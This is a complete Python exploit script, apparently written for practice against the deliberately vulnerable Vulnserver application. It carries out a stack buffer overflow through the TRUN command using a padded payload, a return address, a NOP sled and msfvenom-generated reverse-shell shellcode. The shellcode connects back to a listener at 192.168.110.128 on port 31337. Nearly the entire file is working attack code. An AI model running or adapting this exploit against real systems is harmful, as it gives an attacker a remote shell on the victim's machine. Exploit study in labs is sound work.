#!/usr/bin/python
import optparse, sys, socket

parser = optparse.OptionParser('Example: python eip_finder.py -t <target host> -p <target port>')
parser.add_option('-t', dest='target', type='string', help='Enter a target host')
parser.add_option('-p', dest='port', type='int', help='Enter a target port')
(options, args) = parser.parse_args()
target = options.target
port = options.port

if (target == None) | (port == None):
	print(parser.usage)
	exit(0)

print('\n-------------------------------VULNSERVER EXPLOIT-------------------------------')
print('                              Author: @rootshooter')
print('                                  Version: 1.0')
print('--------------------------------------------------------------------------------')

command = "TRUN /.:/"
ret = '\xaf\x11\x50\x62'
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.110.128 LPORT=31337 EXITFUNC=thread -f c -a x86 -b "\x00" 
shell_code = ("\xd9\xc8\xb8\x7f\xa3\x92\x73\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x31\x47\x17\x03\x47\x17\x83\xb8\xa7\x70\x86\xba\x40\xf6"
"\x69\x42\x91\x97\xe0\xa7\xa0\x97\x97\xac\x93\x27\xd3\xe0\x1f"
"\xc3\xb1\x10\xab\xa1\x1d\x17\x1c\x0f\x78\x16\x9d\x3c\xb8\x39"
"\x1d\x3f\xed\x99\x1c\xf0\xe0\xd8\x59\xed\x09\x88\x32\x79\xbf"
"\x3c\x36\x37\x7c\xb7\x04\xd9\x04\x24\xdc\xd8\x25\xfb\x56\x83"
"\xe5\xfa\xbb\xbf\xaf\xe4\xd8\xfa\x66\x9f\x2b\x70\x79\x49\x62"
"\x79\xd6\xb4\x4a\x88\x26\xf1\x6d\x73\x5d\x0b\x8e\x0e\x66\xc8"
"\xec\xd4\xe3\xca\x57\x9e\x54\x36\x69\x73\x02\xbd\x65\x38\x40"
"\x99\x69\xbf\x85\x92\x96\x34\x28\x74\x1f\x0e\x0f\x50\x7b\xd4"
"\x2e\xc1\x21\xbb\x4f\x11\x8a\x64\xea\x5a\x27\x70\x87\x01\x20"
"\xb5\xaa\xb9\xb0\xd1\xbd\xca\x82\x7e\x16\x44\xaf\xf7\xb0\x93"
"\xd0\x2d\x04\x0b\x2f\xce\x75\x02\xf4\x9a\x25\x3c\xdd\xa2\xad"
"\xbc\xe2\x76\x61\xec\x4c\x29\xc2\x5c\x2d\x99\xaa\xb6\xa2\xc6"
"\xcb\xb9\x68\x6f\x61\x40\xfb\x50\xde\x24\x7b\x38\x1d\xb8\x01"
"\xd0\xa8\x5e\x9f\x32\xfd\xc9\x08\xaa\xa4\x81\xa9\x33\x73\xec"
"\xea\xb8\x70\x11\xa4\x48\xfc\x01\x51\xb9\x4b\x7b\xf4\xc6\x61"
"\x13\x9a\x55\xee\xe3\xd5\x45\xb9\xb4\xb2\xb8\xb0\x50\x2f\xe2"
"\x6a\x46\xb2\x72\x54\xc2\x69\x47\x5b\xcb\xfc\xf3\x7f\xdb\x38"
"\xfb\x3b\x8f\x94\xaa\x95\x79\x53\x05\x54\xd3\x0d\xfa\x3e\xb3"
"\xc8\x30\x81\xc5\xd4\x1c\x77\x29\x64\xc9\xce\x56\x49\x9d\xc6"
"\x2f\xb7\x3d\x28\xfa\x73\x4d\x63\xa6\xd2\xc6\x2a\x33\x67\x8b"
"\xcc\xee\xa4\xb2\x4e\x1a\x55\x41\x4e\x6f\x50\x0d\xc8\x9c\x28"
"\x1e\xbd\xa2\x9f\x1f\x94")
payload = "A" * 2003 + ret + '\x90' * 32 + shell_code

try:
	print('\n[+] Sending Payload')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target , port))
	s.send((command + payload))
	s.close()
	print('[+] Payload Sent')
	print('[+] Check Your Listener\n')
	print('--------------------------------------------------------------------------------')
except:
	print('[-] ERROR: Connection Refused!\n')
	sys.exit()
